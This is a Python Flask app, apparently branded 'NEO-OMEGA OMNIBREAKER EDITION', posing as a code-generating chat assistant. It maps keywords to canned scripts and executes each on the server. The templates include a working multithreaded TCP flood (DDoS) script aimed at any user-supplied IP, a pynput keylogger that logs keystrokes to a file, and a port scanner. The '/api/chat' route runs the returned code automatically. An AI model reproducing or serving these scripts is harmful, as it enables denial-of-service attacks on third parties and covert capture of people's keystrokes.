import os
import sys
import json
import time
import subprocess
import tempfile
import re
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

NAMA = "NEO-OMEGA v∞"
PENCIPTA = "TUAN YATZZ"
VERSI = "OMNIBREAKER EDITION"

error_memory = []

def learn_from_error(error_text):
    error_memory.append({"error": error_text, "time": time.time()})

def detect_language(command):
    cmd = command.lower()
    if "python" in cmd or "py" in cmd:
        return "python"
    if "javascript" in cmd or "js" in cmd or "node" in cmd:
        return "javascript"
    if "go" in cmd or "golang" in cmd:
        return "go"
    if "html" in cmd or "web" in cmd or "halaman" in cmd:
        return "html"
    if "php" in cmd:
        return "php"
    if "bash" in cmd or "shell" in cmd:
        return "bash"
    return "python"

def detect_intent(command):
    cmd = command.lower()
    if "siapa pencipta" in cmd or "pencipta" in cmd:
        return "pencipta"
    if "ddos" in cmd or "attack" in cmd:
        return "ddos"
    if "keylog" in cmd:
        return "keylogger"
    if "web server" in cmd or "flask" in cmd:
        return "webserver"
    if "port scan" in cmd:
        return "portscan"
    if "password" in cmd and ("gen" in cmd or "buat" in cmd):
        return "passwordgen"
    if "jelaskan" in cmd or "explain" in cmd:
        return "explain"
    return "generate"

def generate_code(command, intent, language):
    if intent == "pencipta":
        return f'''
print("Pencipta: {PENCIPTA}")
print("Saya dibuat oleh {PENCIPTA}")
'''
    if intent == "ddos":
        return '''
import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")
'''
    if intent == "keylogger":
        return '''
from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    if intent == "webserver":
        return '''
from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "NEO-OMEGA WEB SERVER ACTIVE"
app.run(host='0.0.0.0', port=5000)
'''
    if intent == "portscan":
        return '''
import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")
'''
    if intent == "passwordgen":
        return '''
import random, string
length = int(input("Panjang password: "))
print(''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length)))
'''
    if intent == "explain":
        return f'''
print("Saya bisa membuat kode sesuai permintaan.")
print("Contoh: DDoS, keylogger, web server, port scanner, password generator")
print("Tulis permintaan dengan jelas.")
'''
    return f'''
print("Perintah: {command}")
print("Saya siap membantu!")
'''

def execute_code(code):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        tmp = f.name
    try:
        result = subprocess.run(["python3", tmp], capture_output=True, text=True, timeout=5)
        output = result.stdout + result.stderr
        if result.returncode != 0:
            learn_from_error(result.stderr)
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Timeout"
    except Exception as e:
        learn_from_error(str(e))
        return f"[ERROR] {str(e)}"

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    command = data.get('message', '').strip()
    if not command:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    lang = detect_language(command)
    intent = detect_intent(command)
    code = generate_code(command, intent, lang)
    output = execute_code(code)
    
    response_text = f"""
Perintah: {command}
Bahasa: {lang.upper()}
Intent: {intent}

Kode:
{code}

Output:
{output}
"""
    return jsonify({'response': response_text, 'code': code, 'output': output})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
